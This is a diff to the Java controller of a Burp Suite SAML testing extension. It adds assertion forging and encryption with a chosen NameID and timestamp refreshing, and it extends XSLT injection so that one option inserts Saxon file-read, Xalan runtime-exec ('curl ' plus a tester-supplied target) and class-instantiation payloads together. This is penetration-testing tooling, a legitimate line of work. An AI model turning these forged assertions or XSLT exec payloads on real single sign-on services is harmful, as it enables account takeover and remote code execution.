@@ -10,6 +10,7 @@ import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.ui.Selection;
 import burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;
 import gui.CVEHelpWindow;
+import gui.EncryptAssertionDialog;
 import gui.SamlMain;
 import gui.SamlPanelInfo;
 import gui.SamlXmlEditor;
@@ -100,6 +101,10 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     // Captured at setRequestResponse time so Dupe-Key Confusion can restore
     // the victim identity after the user re-signs with an attacker key.
     private String originalX509Cert = null;
+    // X509IssuerName extracted verbatim from the original EncryptedAssertion's KeyInfo.
+    // Preserved so Encrypt Assertion can reproduce the exact DN format the target IdP uses,
+    // rather than recomputing it via Java's RFC 2253 serialization.
+    private String capturedIssuerName = null;
 
     public SamlTabController(boolean editable, CertificateTabController certificateTabController) {
         this.certificateTabController = requireNonNull(certificateTabController, "certificateTabController");
@@ -289,13 +294,21 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
 
             // Detect whether the loaded message has a signature so staleness can be tracked.
             // Also remember the original X509Certificate for Dupe Key Confusion.
+            // Also capture the X509IssuerName verbatim from any EncryptedAssertion so
+            // Encrypt Assertion can reproduce the exact DN format the target IdP used.
             hadSignature = false;
             originalX509Cert = null;
+            capturedIssuerName = null;
             try {
                 Document sigDoc = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);
                 hadSignature = sigDoc.getElementsByTagNameNS("*", "Signature").getLength() > 0;
                 if (hadSignature) {
                     originalX509Cert = xmlHelpers.getCertificate(sigDoc.getDocumentElement());
+                }
+                org.w3c.dom.NodeList issuerNames = sigDoc.getElementsByTagNameNS(
+                        "http://www.w3.org/2000/09/xmldsig#", "X509IssuerName");
+                if (issuerNames.getLength() > 0) {
+                    capturedIssuerName = issuerNames.item(0).getTextContent().trim();
                 }
             } catch (Exception ignored) {}
             signatureIsStale = false;
@@ -499,7 +512,7 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     }
 
     private void updateCertificateList() {
-        List<BurpCertificate> list = certificateTabController.getCertificatesWithPrivateKey();
+        List<BurpCertificate> list = certificateTabController.getAllCertificates();
         samlGUI.getActionPanel().setCertificateList(list);
     }
 
@@ -633,6 +646,19 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
         }
     }
 
+    public void applyRefreshTimestamps() {
+        try {
+            samlMessage = AssertionManipulator.refreshTimestamps(textArea.getText());
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("Timestamps refreshed — window: now−1h to now+1h");
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
     public void applyExtendValidity(int hours) {
         try {
             samlMessage = AssertionManipulator.extendValidity(textArea.getText(), hours);
@@ -657,6 +683,77 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
             setInfoMessageText(e.getMessage());
             BurpExtender.api.logging().logToError(e);
         }
+    }
+
+    public void applyEncryptAssertion() {
+        var cert = samlGUI.getActionPanel().getSelectedCertificate();
+        if (cert == null || cert.getCertificate() == null) {
+            setInfoMessageText("Select the SP's certificate in the Certificate dropdown first (import via Import Metadata).");
+            return;
+        }
+        try {
+            String xml = textArea.getText();
+            Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(xml);
+
+            if (doc.getElementsByTagNameNS("*", "Assertion").getLength() == 0) {
+                // No plaintext assertion present — offer to build one from response metadata.
+                String issuer      = xmlHelpers.getIssuer(doc);
+                String destination = xmlHelpers.getResponseAttribute(doc, "Destination");
+                String audience    = deriveAudience(destination);
+                String nameIdFmt   = "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress";
+
+                var dialog = new EncryptAssertionDialog(
+                        BurpExtender.api.userInterface().swingUtils().suiteFrame(),
+                        issuer, nameIdFmt, destination, audience);
+                dialog.setVisible(true);
+                if (!dialog.isConfirmed()) return;
+
+                String nameId = dialog.getNameId();
+                if (nameId.isBlank()) {
+                    setInfoMessageText("NameID is required.");
+                    return;
+                }
+
+                String assertionXml = helpers.AssertionBuilder.build(
+                        dialog.getIssuer(), nameId, dialog.getNameIdFormat(),
+                        dialog.getRecipient(), dialog.getAudience());
+
+                // Import the built assertion into the Response DOM, replacing
+                // any EncryptedAssertion or appending to the Response element.
+                Document assertionDoc = xmlHelpers.getXMLDocumentOfSAMLMessage(assertionXml);
+                Node assertionNode = doc.importNode(assertionDoc.getDocumentElement(), true);
+
+                NodeList encAssertions = doc.getElementsByTagNameNS("*", "EncryptedAssertion");
+                if (encAssertions.getLength() > 0) {
+                    Node enc = encAssertions.item(0);
+                    enc.getParentNode().replaceChild(assertionNode, enc);
+                } else {
+                    NodeList responses = xmlHelpers.getResponse(doc);
+                    if (responses.getLength() > 0) responses.item(0).appendChild(assertionNode);
+                }
+
+                xml = xmlHelpers.getString(doc);
+            }
+
+            var keyInfoStyle = samlGUI.getActionPanel().getSelectedKeyInfoStyle();
+            samlMessage = helpers.AssertionEncryptor.encrypt(xml, cert.getCertificate(), keyInfoStyle, capturedIssuerName);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("Assertion encrypted with: " + cert.getCertificate().getSubjectX500Principal().getName());
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    private static String deriveAudience(String destination) {
+        if (destination == null || destination.isBlank()) return "";
+        // Strip ACS path suffix (e.g. /saml/SSO) to get the SP entity ID
+        int idx = destination.indexOf("/saml/");
+        if (idx > 0) return destination.substring(0, idx);
+        int slash = destination.lastIndexOf('/');
+        if (slash > 8) return destination.substring(0, slash);
+        return destination;
     }
 
     public void applyRemoveAudience() {
@@ -800,13 +897,13 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
                 setInfoMessageText("Metadata contained no <ds:X509Certificate> entries.");
                 return;
             }
+            // Deduplicate by cert bytes — metadata often lists the same cert
+            // under both "signing" and "encryption" KeyDescriptors.
+            var seen = new java.util.LinkedHashSet<String>();
             int imported = 0;
             for (var entry : entries) {
-                // Build PEM-wrapped string so the existing importer parses it as a certificate.
-                String pem = "-----BEGIN CERTIFICATE-----\n"
-                        + wrap64(entry.base64Der())
-                        + "-----END CERTIFICATE-----\n";
-                var cert = certificateTabController.importCertificateFromString(pem);
+                if (!seen.add(entry.base64Der())) continue;
+                var cert = certificateTabController.importCertificateFromString(entry.base64Der());
                 if (cert != null) imported++;
             }
             setInfoMessageText("Imported " + imported + " certificate(s) from metadata");
@@ -814,14 +911,6 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
             setInfoMessageText(e.getMessage());
             BurpExtender.api.logging().logToError(e);
         }
-    }
-
-    private static String wrap64(String b64) {
-        StringBuilder sb = new StringBuilder();
-        for (int i = 0; i < b64.length(); i += 64) {
-            sb.append(b64, i, Math.min(i + 64, b64.length())).append('\n');
-        }
-        return sb.toString();
     }
 
     public void applyResponseXSS(ResponseXSS.Target target, String payload) {
@@ -890,8 +979,17 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
         }
 
         var prefix = prefixed ? "ds:" : "";
-        var stylesheet = XSLTPayloads.stylesheetFor(flavor, param);
-        var xslt = "\n<%sTransform>\n%s\n</%sTransform>\n".formatted(prefix, stylesheet, prefix);
+        String xslt;
+        String statusSuffix;
+        if (flavor == XSLTPayloads.Flavor.ALL) {
+            xslt = xsltTransform(prefix, XSLTPayloads.Flavor.SAXON_UNPARSED_TEXT, param)
+                 + xsltTransform(prefix, XSLTPayloads.Flavor.XALAN_RUNTIME_EXEC, "curl " + param)
+                 + xsltTransform(prefix, XSLTPayloads.Flavor.XALAN_CLASS_INSTANTIATION, param);
+            statusSuffix = " (all 3 flavors)";
+        } else {
+            xslt = xsltTransform(prefix, flavor, param);
+            statusSuffix = " (" + flavor.name() + ")";
+        }
 
         int substringIndex = index + transformString.length();
         String firstPart = current.substring(0, substringIndex);
@@ -899,8 +997,13 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
         samlMessage = firstPart + xslt + secondPart;
         textArea.setText(prettifyXmlOrFallback(samlMessage));
         isEdited = true;
-        setInfoMessageText(XSLT_CONTENT_APPLIED + " (" + flavor.name() + ")");
+        setInfoMessageText(XSLT_CONTENT_APPLIED + statusSuffix);
         markSignatureStale();
+    }
+
+    private static String xsltTransform(String prefix, XSLTPayloads.Flavor flavor, String param) {
+        return "\n<%sTransform>\n%s\n</%sTransform>\n".formatted(
+                prefix, XSLTPayloads.stylesheetFor(flavor, param), prefix);
     }
 
     public synchronized void addMatchAndReplace(String match, String replace) {
